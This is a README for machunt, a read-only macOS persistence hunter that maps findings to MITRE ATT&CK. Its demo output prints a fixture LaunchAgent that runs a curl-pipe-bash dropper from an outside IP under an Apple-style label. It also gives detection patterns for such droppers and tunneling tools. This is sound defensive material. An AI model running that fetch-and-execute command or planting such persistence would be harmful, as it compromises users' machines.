<h1 align="center">machunt</h1>
<p align="center"><b>A macOS-native threat hunter.</b> Audits where Mac malware actually hides, mapped to MITRE ATT&amp;CK. Strictly read-only.</p>

<p align="center">
  <img src="https://img.shields.io/badge/python-3.9%2B-blue?logo=python&logoColor=white">
  <img src="https://img.shields.io/badge/platform-macOS-000000?logo=apple">
  <img src="https://img.shields.io/badge/framework-MITRE%20ATT%26CK-d7263d">
  <img src="https://img.shields.io/badge/license-MIT-green">
</p>

---

The security world is obsessed with Windows and Linux - macOS gets ignored, even as Mac malware keeps growing.
`machunt` hunts every major persistence technique right on the Mac it runs on, scores what it finds, and maps every hit to a **MITRE ATT&CK** technique.
It never modifies anything on the system.

## What it hunts

| Area | ATT&CK | What it catches |
|------|--------|-----------------|
| LaunchAgents / LaunchDaemons | T1543.001 / .004 | `curl ... \| bash`, base64 payloads, `com.apple.*` masquerade, unsigned/ad-hoc-signed binaries, quarantine xattr |
| Shell startup (user) | T1546.004 | malicious lines in `.zshrc`, `.bash_profile`, `.profile`, `.zprofile`, `.zlogin` |
| Global shell config | T1546.004 | suspicious lines in `/etc/zshenv`, `/etc/profile`, `/etc/bashrc`, `/etc/zshrc` |
| Cron | T1053.003 | suspicious scheduled jobs in user crontab |
| at jobs + /etc/periodic | T1037 / T1053 | queued `at` jobs; scripts in `/etc/periodic/{daily,weekly,...}` |
| Login/Logout hooks | T1037.001 | LoginHook and LogoutHook from `com.apple.loginwindow` |
| Login items | T1547.015 | apps that auto-run at user login |
| SSH | T1098.004 | authorized_keys (count + forced-command analysis), ProxyCommand abuse in `~/.ssh/config` |
| sudoers | T1548.003 | NOPASSWD rules, wildcard ALL grants |
| Configuration profiles | T1553 / MDM | installed profiles that may install certificates or redirect traffic |
| TCC permissions | T1548 | apps with Full Disk Access, Accessibility, or Screen Recording grants |
| Browser extensions | T1176 | Chrome, Brave, Arc, Firefox, Safari extensions with risky permissions |
| Kernel / system extensions | T1547.006 | `systemextensionsctl list`, `kmutil showloaded` |
| Network listeners | T1049 / T1071 | TCP listeners; flags processes running from non-standard paths |
| Recently modified files | T1543 | executables in persistence dirs modified in the last 3 days |
| Running processes | T1059 | live processes with suspicious command lines |

## Quick start

```bash
git clone https://github.com/Halting24/machunt && cd machunt
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt          # just 'rich' for coloured output

machunt hunt                             # full read-only audit of this Mac
machunt hunt --demo                      # add bundled threat fixture to the scan
machunt hunt --demo-only                 # scan ONLY the fixture (safe, isolated)
```

## All flags

```text
machunt hunt                             # default: full audit to terminal
machunt hunt --json                      # JSON array to stdout (pipe into jq / SIEM)
machunt hunt --sarif                     # SARIF 2.1.0 JSON (GitHub code scanning)
machunt hunt --html report.html          # self-contained HTML report to a file
machunt hunt --snapshot baseline.json   # save current state for later diff
machunt hunt --baseline baseline.json   # show only NEW findings vs saved baseline
machunt hunt --allowlist allow.txt       # suppress known-good labels/paths (INFO only)
machunt hunt --demo                      # real audit + bundled malicious fixture
machunt hunt --demo-only                 # fixture only (no real-machine data)
```

Flags can be combined:

```bash
machunt hunt --json > findings.json
machunt hunt --html /tmp/report.html --snapshot /tmp/base.json
machunt hunt --baseline /tmp/base.json --sarif > delta.sarif
```

## Demo

```text
$ machunt hunt --demo-only

  machunt - macOS threat hunt (demo fixtures included)
  HIGH 1  MEDIUM 0  LOW 0  INFO 2    3 findings    risk: ELEVATED

  sev     MITRE ATT&CK                   finding                              detail
  HIGH    T1543.001 (Launch Agent)        persistence: com.apple.              /bin/bash -c curl -fsSL http://193.0.0.7/x.sh | bash
                                          softwareupdated.helper               -> downloads and pipes to a shell; Apple-style label on ...
  INFO    T1543.001 (Launch Agent)        persistence: com.docker.helper       auto-runs and restarts: /Applications/Docker.app/...
  INFO    T1543.001 (Launch Agent)        persistence: com.spotify.webhelper   auto-runs and restarts: /Applications/Spotify.app/...
  [!] high-severity persistence found. Investigate the paths above.
```

The planted `com.apple.softwareupdated.helper` is caught as HIGH (curl-pipe-bash dropper masquerading as Apple).
Docker and Spotify appear as INFO only.

## Baseline and diff (IR workflow)

```bash
# capture clean state first
machunt hunt --snapshot /tmp/baseline.json

# ... later, after an incident or software change ...
machunt hunt --baseline /tmp/baseline.json
# prints only new or changed findings since the baseline
```

## Allowlist

Create a plain-text file with one token per line (label prefix or path fragment).
Lines starting with `#` are ignored. Suppressions only apply to INFO-level findings;
HIGH and MEDIUM are never suppressed.

```text
# allow.txt
com.mycompany.
/opt/internal-tools/
```

```bash
machunt hunt --allowlist allow.txt
```

## SARIF output (GitHub code scanning)

```bash
machunt hunt --sarif > machunt.sarif
# upload via GitHub Actions: upload-artifact or upload-sarif action
```

## Extra rules (rules.yaml)

Drop a `rules.yaml` in the same directory as `machunt.py`.
Rules are loaded automatically if `pyyaml` is importable; the tool degrades
gracefully without it.

```yaml
- pattern: "ngrok|pagekite"
  why: "tunneling tool creates external exposure"
  severity: "medium"
  attck: "T1572 (Protocol Tunneling)"
```

A sample `rules.yaml` with common red-team tool signatures is included.
Install pyyaml with `pip install pyyaml` to activate it.

## Dependencies

| Package | Required | Purpose |
|---------|----------|---------|
| `rich`  | No (optional) | Coloured terminal output; degrades to plain text |
| `pyyaml` | No (optional) | Loading extra rules from `rules.yaml` |

Core logic uses only Python stdlib (subprocess, plistlib, sqlite3, json, re, pathlib, ...).

## Architecture (single file)

```
machunt.py
  RULES[]              - structured rule engine (pattern, why, severity, attck)
  Finding dataclass    - severity / attck / title / detail / path / fingerprint
  hunt_launch()        - T1543.001 / T1543.004
  hunt_shell_rc()      - T1546.004 (user shell files)
  hunt_global_shell()  - T1546.004 (/etc/zshenv, /etc/profile, ...)
  hunt_cron()          - T1053.003
  hunt_at_jobs()       - T1037 / T1053
  hunt_login_items()   - T1547.015
  hunt_ssh()           - T1098.004
  hunt_sudoers()       - T1548.003
  hunt_config_profiles()  - T1553 / MDM
  hunt_tcc_hints()     - T1548 (read-only sqlite3)
  hunt_browser_extensions() - T1176
  hunt_kernel_extensions()  - T1547.006
  hunt_network_listeners()  - T1049 / T1071
  hunt_recently_modified()  - T1543
  hunt_processes()     - T1059
  snapshot() / diff_baseline()  - IR baseline support
  to_sarif()           - SARIF 2.1.0 formatter
  to_html()            - self-contained HTML report
  report()             - rich / plain-text table
  main()               - CLI with argparse
```

## Read-only guarantee

`machunt` never writes to system locations. The only writes it performs are to
output files you explicitly request with `--html` or `--snapshot`. It invokes
macOS CLIs (`codesign`, `lsof`, `profiles`, `systemextensionsctl`, `kmutil`,
`defaults`) with `subprocess` in capture-only mode. All subprocess calls have
timeouts and fail gracefully if a command is absent.

---
<p align="center"><i>Part of a cybersecurity project series - <a href="https://github.com/Halting24">@Halting24</a></i></p>
